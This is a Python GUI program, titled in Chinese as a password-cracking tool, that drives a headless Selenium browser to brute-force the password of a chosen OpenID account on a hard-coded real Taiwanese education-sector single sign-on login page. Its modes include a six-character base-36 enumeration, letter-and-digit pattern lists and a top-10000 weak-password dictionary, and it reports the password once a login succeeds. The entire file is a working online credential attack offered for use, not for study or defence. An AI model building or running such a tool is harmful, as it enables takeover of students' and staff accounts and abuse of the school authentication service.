import tkinter as tk
from tkinter import ttk, messagebox
from threading import Thread
from time import sleep as sl
from selenium import webdriver
from selenium.webdriver.common.by import By

# 定義目標 URL
# 定義常用字元列表
BIG_EN = [
    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
    "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"
]

SMALL_EN = [
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
    "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"
]

CONTINUOUS_EN = [
    # 三字母重複組合（小寫）
    "aaa", "bbb", "ccc", "ddd", "eee", "fff", "ggg", "hhh", "iii", "jjj",
    "kkk", "lll", "mmm", "nnn", "ooo", "ppp", "qqq", "rrr", "sss", "ttt",
    "uuu", "vvv", "www", "xxx", "yyy", "zzz",
    
    # 大小寫英文配對
    "Aa", "Bb", "Cc", "Dd", "Ee", "Ff", "Gg", "Hh", "Ii", "Jj", "Kk", "Ll", "Mm",
    "Nn", "Oo", "Pp", "Qq", "Rr", "Ss", "Tt", "Uu", "Vv", "Ww", "Xx", "Yy", "Zz",
    
    # 三字母重複組合（大寫）
    "AAA", "BBB", "CCC", "DDD", "EEE", "FFF", "GGG", "HHH", "III", "JJJ",
    "KKK", "LLL", "MMM", "NNN", "OOO", "PPP", "QQQ", "RRR", "SSS", "TTT",
    "UUU", "VVV", "WWW", "XXX", "YYY", "ZZZ",
    
    # 連續字母組合
    "abc", "ABC", "Abc", "abcd", "ABCD", "Abcd", "abcde", "ABCDE", "Abcde",
    "abcdef", "ABCDEF", "Abcdef", "abcdefg", "ABCDEFG", "Abcdefg",
    "abcdefgh", "ABCDEFGH", "Abcdefgh", "abcdefghi", "ABCDEFGHI", "Abcdefghi",
    "abcdefghij", "ABCDEFGHIJ", "Abcdefghij",
]

MATH = [
    # 連續數字 (1-9位數)
    "12", "123", "1234", "12345", "123456", "1234567", "12345678", "123456789",
    "01", "012", "0123", "01234", "012345", "0123456", "01234567", "012345678", "0123456789",
    
    # 重複數字 (1-6位數)
    "0", "00", "000", "0000", "00000", "000000",
    "1", "11", "111", "1111", "11111", "111111",
    "2", "22", "222", "2222", "22222", "222222",
    "3", "33", "333", "3333", "33333", "333333",
    "4", "44", "444", "4444", "44444", "444444",
    "5", "55", "555", "5555", "55555", "555555",
    "6", "66", "666", "6666", "66666", "666666",
    "7", "77", "777", "7777", "77777", "777777",
    "8", "88", "888", "8888", "88888", "888888",
    "9", "99", "999", "9999", "99999", "999999"
]

# 定義目標 URL
URL = "https://kh.sso.edu.tw/auth-server-stlogin?Auth_Request_RedirectUri=https%253A%252F%252Foidc.tanet.edu.tw%252Fcncreturnpage&Auth_Request_State=a1h8GqiVsrDoNh4wHfqx3IIcWZbx0JrRRDGpc8cGzRk&Auth_Request_Response_Type=code&Auth_Request_Client_ID=cf789350df91c914eede027ce55f3ab5&Auth_Request_Nonce=bKyFuJbbQXulFBTlu3yv5o16-UOKzp4QaK7gfId4Op0&Auth_Request_Scope=openid+exchangedata&local=true"

class PasswordCrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("密碼破解工具")
        self.root.geometry("600x500")
        
        # 創建主框架
        self.main_frame = ttk.Frame(root, padding="10")
        self.main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # OpenID 輸入
        ttk.Label(self.main_frame, text="OpenID 帳號:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.openid_var = tk.StringVar()
        self.openid_entry = ttk.Entry(self.main_frame, textvariable=self.openid_var, width=40)
        self.openid_entry.grid(row=0, column=1, columnspan=2, sticky=tk.W, pady=5)
        
        # 模式選擇
        ttk.Label(self.main_frame, text="破解模式:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.mode_var = tk.StringVar(value="base36")
        modes = [
            ("36進制6位破解", "base36"),
            ("常用連續字母破解", "continuous"),
            ("大寫開頭破解", "upper"),
            ("小寫開頭破解", "lower"),
            ("弱口令字典破解", "weak"),
            ("全模式破解", "all")
        ]
        
        # 使用Radiobutton來選擇模式
        mode_frame = ttk.LabelFrame(self.main_frame, text="選擇模式", padding="5")
        mode_frame.grid(row=2, column=0, columnspan=3, sticky=tk.W, pady=5)
        
        for i, (text, value) in enumerate(modes):
            ttk.Radiobutton(mode_frame, text=text, value=value, 
                          variable=self.mode_var).grid(row=i//2, column=i%2, sticky=tk.W, padx=5, pady=2)
        
        # 忽略位數選項
        self.ignore_var = tk.BooleanVar()
        ttk.Checkbutton(self.main_frame, text="忽略特定位數以下的密碼", 
                       variable=self.ignore_var, command=self.toggle_ignore_digits).grid(
            row=3, column=0, columnspan=2, sticky=tk.W, pady=5)
        
        # 位數輸入
        self.digits_frame = ttk.Frame(self.main_frame)
        self.digits_frame.grid(row=4, column=0, columnspan=2, sticky=tk.W, pady=5)
        ttk.Label(self.digits_frame, text="忽略位數:").grid(row=0, column=0, padx=5)
        self.digits_var = tk.StringVar(value="6")
        self.digits_entry = ttk.Entry(self.digits_frame, textvariable=self.digits_var, width=5)
        self.digits_entry.grid(row=0, column=1)
        self.digits_entry.configure(state='disabled')
        
        # 進度顯示
        self.progress_frame = ttk.LabelFrame(self.main_frame, text="執行進度", padding="5")
        self.progress_frame.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)
        
        self.status_var = tk.StringVar(value="準備就緒")
        ttk.Label(self.progress_frame, textvariable=self.status_var).grid(
            row=0, column=0, sticky=tk.W, pady=5)
        
        self.current_password_var = tk.StringVar()
        ttk.Label(self.progress_frame, text="當前嘗試密碼:").grid(row=1, column=0, sticky=tk.W)
        ttk.Label(self.progress_frame, textvariable=self.current_password_var).grid(
            row=1, column=1, sticky=tk.W)
        
        # 控制按鈕
        self.button_frame = ttk.Frame(self.main_frame)
        self.button_frame.grid(row=6, column=0, columnspan=3, pady=10)
        
        self.start_button = ttk.Button(self.button_frame, text="開始破解", command=self.start_cracking)
        self.start_button.grid(row=0, column=0, padx=5)
        
        self.stop_button = ttk.Button(self.button_frame, text="停止", command=self.stop_cracking)
        self.stop_button.grid(row=0, column=1, padx=5)
        self.stop_button.configure(state='disabled')
        
        # 運行狀態
        self.running = False
        self.driver = None

    def toggle_ignore_digits(self):
        """啟用/禁用位數輸入"""
        if self.ignore_var.get():
            self.digits_entry.configure(state='normal')
        else:
            self.digits_entry.configure(state='disabled')

    def update_status(self, message):
        """更新狀態顯示"""
        self.status_var.set(message)
        self.root.update()

    def update_current_password(self, password):
        """更新當前嘗試的密碼"""
        self.current_password_var.set(password)
        self.root.update()

    def start_cracking(self):
        """開始破解密碼"""
        if not self.openid_var.get():
            messagebox.showerror("錯誤", "請輸入OpenID帳號")
            return
            
        self.running = True
        self.start_button.configure(state='disabled')
        self.stop_button.configure(state='normal')
        
        # 在新線程中運行破解程序
        Thread(target=self.crack_password).start()

    def stop_cracking(self):
        """停止破解密碼"""
        self.running = False
        self.update_status("正在停止...")
        self.stop_button.configure(state='disabled')
        
        if self.driver:
            self.driver.quit()
            self.driver = None

        self.start_button.configure(state='normal')
        self.update_status("已停止")

    def crack_password(self):
        """密碼破解的主要邏輯"""
        try:
            self.update_status("初始化瀏覽器...")
            
            # 初始化 Chrome
            chrome_options = webdriver.ChromeOptions()
            chrome_options.add_argument('--headless')
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_window_size(375, 512)
            
            # 打開目標網址
            self.driver.get(URL)
            self.update_status("開始破解...")
            
            # 根據選擇的模式執行相應的破解邏輯
            mode = self.mode_var.get()
            if mode == "base36":
                self.mode_base36()
            elif mode == "continuous":
                self.mode_continuous()
            elif mode == "upper":
                self.mode_upper()
            elif mode == "lower":
                self.mode_lower()
            elif mode == "weak":
                self.mode_weak()
            elif mode == "all":
                self.mode_all()
            
        except Exception as e:
            messagebox.showerror("錯誤", f"執行過程中發生錯誤：{str(e)}")
        finally:
            self.stop_cracking()

    def try_password(self, password):
        """嘗試密碼"""
        if not self.running:
            return True
            
        self.update_current_password(password)
        
        # 檢查是否需要忽略特定位數以下的密碼
        if self.ignore_var.get():
            try:
                ignore_digits = int(self.digits_var.get())
                if len(password.lstrip('0')) < ignore_digits:
                    return False
            except ValueError:
                pass
                
        try:
            login = self.driver.find_element(By.ID, "idf")
            username = self.driver.find_element(By.NAME, "username")
            passwd = self.driver.find_element(By.NAME, "password")
            
            username.clear()
            passwd.clear()
            username.send_keys(self.openid_var.get())
            passwd.send_keys(password)
            login.click()
            
            sl(0.05)  # 短暫延遲
            
            # 檢查是否登入成功
            try:
                self.driver.find_element(By.ID, "idf")
                return False
            except:
                messagebox.showinfo("成功", f"密碼破解成功！密碼是：{password}")
                return True
                
        except Exception as e:
            self.update_status(f"嘗試密碼 {password} 時發生錯誤")
            return False

    def get_txt_passwd_efficient(self):
        """高效率讀取密碼字典文件"""
        try:
            passwords = []
            with open("passwd-CN-Top10000.txt", "r", encoding='utf-8') as file:
                passwords = [line.strip() for line in file]
            return passwords
        except Exception as e:
            messagebox.showerror("錯誤", f"讀取密碼字典時發生錯誤：{str(e)}")
            return []

    def mode_continuous(self):
        """常用連續字母破解模式"""
        for i in CONTINUOUS_EN:
            if not self.running:
                return
            for r in MATH:
                if not self.running:
                    return
                if self.try_password(i+r):
                    return
                sl(0.05)

    def mode_upper(self):
        """大寫開頭破解模式"""
        for i in BIG_EN:
            if not self.running:
                return
            for r in MATH:
                if not self.running:
                    return
                if self.try_password(i+r):
                    return
                sl(0.05)

    def mode_lower(self):
        """小寫開頭破解模式"""
        for i in SMALL_EN:
            if not self.running:
                return
            for r in MATH:
                if not self.running:
                    return
                if self.try_password(i+r):
                    return
                sl(0.05)

    def mode_weak(self):
        """弱口令字典破解模式"""
        passwords = self.get_txt_passwd_efficient()
        if not passwords:
            return
        
        for password in passwords:
            if not self.running:
                return
            if self.try_password(password):
                return
            sl(0.05)

    def mode_all(self):
        """全模式破解"""
        # 依次執行所有模式
        modes = [
            self.mode_base36,
            self.mode_continuous,
            self.mode_upper,
            self.mode_lower,
            self.mode_weak
        ]
        
        for mode_func in modes:
            if not self.running:
                return
            self.update_status(f"執行模式: {mode_func.__name__}")
            mode_func()

    def mode_base36(self):
        """36進制6位破解模式"""
        chars = "0123456789abcdefghijklmnopqrstuvwxyz"
        number = [0, 0, 0, 0, 0, 0]
        
        while self.running:
            current_password = ''.join(chars[n] for n in number)
            
            if self.try_password(current_password):
                return
                
            # 進位邏輯
            pos = 5
            while pos >= 0:
                number[pos] += 1
                if number[pos] == 36:
                    number[pos] = 0
                    pos -= 1
                else:
                    break
                    
            if pos < 0:  # 已經嘗試所有可能
                break

def main():
    root = tk.Tk()
    app = PasswordCrackerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()